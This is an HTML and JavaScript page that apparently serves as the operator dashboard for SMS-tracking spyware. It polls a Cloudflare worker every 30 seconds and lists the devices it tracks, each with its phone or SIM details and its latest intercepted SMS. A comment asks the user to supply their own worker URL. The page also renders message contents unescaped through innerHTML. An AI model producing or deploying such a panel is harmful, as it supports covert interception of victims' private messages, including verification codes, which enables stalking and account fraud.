<!DOCTYPE html>
<html>
<head>
    <title>Master Control Panel</title>
    <style>
        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; padding: 20px; text-align: center; }
        .panel { border: 2px solid #ff0055; padding: 20px; border-radius: 10px; box-shadow: 0 0 15px #ff0055; }
        h1 { color: #ff0055; text-shadow: 0 0 10px #ff0055; }
        .device-card { background: #111; border: 1px solid #333; padding: 15px; margin: 10px; border-radius: 8px; text-align: left; }
        button { background: #ff0055; color: #fff; border: none; padding: 10px 20px; cursor: pointer; border-radius: 5px; font-weight: bold; }
        button:hover { background: #ff3377; }
        .no-data { color: #888; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="panel">
        <h1>MASTER CONTROL PANEL</h1>
        <button onclick="loadDevices()">REFRESH DATA</button>
        <div id="status">Scanning for active devices...</div>
        <div id="deviceList"></div>
    </div>

    <script>
        async function loadDevices() {
            const status = document.getElementById('status');
            const list = document.getElementById('deviceList');
            
            try {
                // ✅ APNA WORKER URL YAHAN DAALEIN
                const response = await fetch('https://sms-tracker-worker.vikash6759ub.workers.dev/api/get-data');
                const devices = await response.json();

                if (devices.length === 0) {
                    status.innerHTML = "No devices found in database.";
                    return;
                }

                status.innerHTML = `Active Devices: ${devices.length}`;
                list.innerHTML = devices.map(d => `
                    <div class="device-card">
                        <b>Device:</b> ${d.brand} <br>
                        <b>Mobile:</b> ${d.sim_info} <br>
                        <b>Last Active:</b> ${d.updated_at} <br>
                        <hr color="#222">
                        <b>Latest SMS:</b> <br>
                        <span style="color: #fff">${d.last_sms || 'No messages yet'}</span>
                    </div>
                `).join('');
            } catch (err) {
                status.innerHTML = "Error: Could not connect to Worker.";
            }
        }
        
        // Auto-load on start
        loadDevices();
        // Refresh every 30 seconds
        setInterval(loadDevices, 30000);
    </script>
</body>
</html>
